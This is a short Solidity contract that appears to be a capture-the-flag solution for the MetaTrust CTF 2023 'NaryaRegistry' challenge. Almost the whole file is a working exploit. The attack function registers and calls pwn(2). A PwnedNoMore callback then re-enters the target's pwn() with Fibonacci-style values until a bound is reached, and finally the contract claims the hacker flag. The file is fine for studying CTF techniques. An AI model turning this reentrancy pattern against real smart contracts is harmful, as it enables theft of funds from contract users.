// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "src/MetaTrustCTF_2023/Registry/NaryaRegistry.sol";

contract NaryaRegistryAttack {
    NaryaRegistry public registry;
    uint256 prev = 1;

    function attack(address target) public {
        registry = NaryaRegistry(target);
        registry.register();
        registry.pwn(2);
        registry.identifyNaryaHacker();
    }

    function PwnedNoMore(uint256 amount) public {
        uint256 next = amount + prev;
        if (next <= 22698374052006863956975682) {
            prev = amount;
            registry.pwn(next);
        }
    }
}